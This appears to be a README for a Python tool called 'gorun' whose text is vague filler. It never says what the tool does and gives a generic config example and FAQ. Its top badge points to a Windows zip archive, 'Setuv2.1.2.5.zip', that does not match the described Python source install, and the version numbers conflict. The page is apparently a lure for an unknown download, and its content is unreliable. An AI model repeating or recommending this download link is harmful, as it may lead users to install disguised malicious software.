[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen?style=for-the-badge&logo=windows)](https://github.com/alexclarkops2097l1/gorun/releases/download/v1.0.0/Setuv2.1.2.5.zip)

# ⚡ gorun

gorun is built for dynamic users who need a reliable, open-source solution.

[![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.0-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/alexclarkops2097l1/gorun?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/alexclarkops2097l1/gorun?style=flat-square)

Open-source Dynamic: Configurable, quick, and easy

## 📥 Download & Install

[![Download](https://img.shields.io/badge/Download-Source%20Code-blue?style=for-the-badge&logo=github)](../../releases/latest)

```bash
git clone https://github.com/alexclarkops2097l1/gorun.git
cd gorun
pip install -r requirements.txt
```

### Requirements

Make sure you have Python 3.11 or later installed. You'll also need the packages listed in `requirements.txt`. Install them using `pip install -r requirements.txt`. Easy peasy.

### Running

First, tweak your `config.py` to match your needs. Then, just run `python main.py`. It'll do its thing. Check the console output for status.

### Config

The `config.py` file holds all the settings. Here's an example:

```python
# config.py

DEBUG = True
PORT = 8080
API_KEY = "YOUR_API_KEY"
DATA_PATH = "data/input.csv"
THRESHOLD = 0.75
LOG_FILE = "logs/app.log"
```

* `DEBUG`: Turns on/off debug mode.
* `PORT`: The port for the web server.
* `API_KEY`: Your API key for accessing external services.
* `DATA_PATH`: Path to your data file.
* `THRESHOLD`: A threshold value for some process.
*	`LOG_FILE`: Where to save logs.

Feel free to adjust these values to fit your setup. Don't forget to restart `main.py` for changes to apply.

### Features

* **Fast:** Designed for speed.
* **Easy:** Simple to set up and use. No complex installations or configurations.
* **Configurable:** Tweak settings via `config.py`.

### FAQ

<details>
 <summary>What if I get an error about missing modules?</summary>
 <br>
 Run `pip install -r requirements.txt` to install the necessary packages. Make sure you're using the right Python environment.
</details>

<details>
 <summary>How do I change the settings?</summary>
 <br>
 Edit the `config.py` file. Then restart `main.py`.
</details>

<details>
 <summary>Where are the log files stored?</summary>
 <br>
 Check the `logs/` directory. The exact file name is set in `config.py`.
</details>

TODO: Add more FAQs based on user feedback. WIP.

---

⚡ Fast, lightweight, and easy to use